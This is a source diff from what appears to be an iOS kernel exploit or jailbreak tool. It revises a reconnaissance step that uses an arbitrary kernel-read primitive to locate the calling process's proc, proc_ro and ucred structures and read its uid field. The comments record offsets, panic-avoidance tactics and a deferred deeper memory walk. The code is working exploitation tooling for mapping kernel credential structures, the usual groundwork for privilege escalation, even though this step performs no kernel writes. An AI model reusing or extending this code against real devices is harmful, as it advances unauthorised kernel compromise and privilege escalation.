@@ -212,41 +212,48 @@ static const char *scopeTypeName(uint8_t t) {
                   (unsigned)koffsetof(pmap, ttep),
                   (unsigned)koffsetof(vm_map_entry, next)]);
 
-    // ---- 4. ucred via calibrated self-proc (KPDump route) ----
-    // Increment after safe-mode survival. Two reads + zone/comm route only.
-    // NO vm_map walk, NO vtophys(ttep), NO kvtophys chasing.
-    [r appendString:@"\n--- ucred (calibrated self-proc) ---\n"];
+    // ---- 4. ucred via proc_self() ONLY (early_kread, soft-fail) ----
+    // findSelfProcByComm / zoneRoute chase the allproc list with the RAW
+    // kreadbuf (icmp6filt) — that is the reboot class. proc_self() uses
+    // early_kread which refuses bad kaddrs and returns 0 instead of panicking.
+    // Run #1 survived with exactly this shape. No walk, no vtophys.
+    [r appendString:@"\n--- ucred (proc_self, soft-fail) ---\n"];
     {
-        uint64_t selfProc = [KPDump findSelfProcByComm:r];
-        if (!selfProc) selfProc = [KPDump zoneRouteSelfProcWithLog:r];
-        scopeNote(r, [NSString stringWithFormat:@"  selfProc = 0x%016llx",
+        uint64_t selfProc = proc_self();
+        scopeNote(r, [NSString stringWithFormat:@"  proc_self() = 0x%016llx",
                       (unsigned long long)selfProc]);
-        uint64_t procRo = 0, ucred = 0;
-        if (selfProc) {
+
+        // Hard stop if proc_self failed — do NOT fall through to zoneRoute.
+        if (!selfProc || ((selfProc & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL)) {
+            scopeNote(r, @"  proc_self() unavailable (soft-fail) — skipping ucred reads.");
+            scopeNote(r, @"  (This is the run #1 shape; device stays up.)");
+        } else {
+            uint64_t procRo = 0, ucred = 0;
             uint64_t raw = 0;
             gPrimitives.kreadbuf(selfProc + off_proc_p_proc_ro, &raw, 8);
             procRo = kp_untag_ptr(raw);
             scopeNote(r, [NSString stringWithFormat:@"  p_proc_ro = 0x%016llx",
                           (unsigned long long)procRo]);
-        }
-        if (procRo && ((procRo & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL)) {
-            uint64_t raw = 0;
-            gPrimitives.kreadbuf(procRo + off_proc_ro_p_ucred, &raw, 8);
-            ucred = kp_untag_ptr(raw);
-            scopeNote(r, [NSString stringWithFormat:@"  p_ucred   = 0x%016llx",
-                          (unsigned long long)ucred]);
-        }
-        if (ucred && ((ucred & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL)) {
-            uint64_t uid = 0;
-            gPrimitives.kreadbuf(ucred + 0x18, &uid, 8);
-            scopeNote(r, [NSString stringWithFormat:@"  ucred+0x18 (uid cluster) = 0x%016llx",
-                          (unsigned long long)uid]);
+
+            if ((procRo & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                raw = 0;
+                gPrimitives.kreadbuf(procRo + off_proc_ro_p_ucred, &raw, 8);
+                ucred = kp_untag_ptr(raw);
+                scopeNote(r, [NSString stringWithFormat:@"  p_ucred   = 0x%016llx",
+                              (unsigned long long)ucred]);
+            }
+            if ((ucred & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                uint64_t uid = 0;
+                gPrimitives.kreadbuf(ucred + 0x18, &uid, 8);
+                scopeNote(r, [NSString stringWithFormat:@"  ucred+0x18 (uid cluster) = 0x%016llx",
+                              (unsigned long long)uid]);
+            }
         }
     }
 
     // ---- 5. Verdict ----
     [r appendString:@"\n--- verdict (safe+ucred) ---\n"];
-    scopeNote(r, @"  Safe+ucred: self-proc + ucred reads only. NO walk, NO vtophys.");
+    scopeNote(r, @"  proc_self soft-fail only. NO findSelfProcByComm, NO zoneRoute, NO walk, NO vtophys.");
     scopeNote(r, @"  Deep recon (ucred FTE + vm_map_entry walk) is deferred until");
     scopeNote(r, @"  the panic source is isolated. Flags above are the R5c result.");
     scopeNote(r, @"  (No kernel writes performed.)");
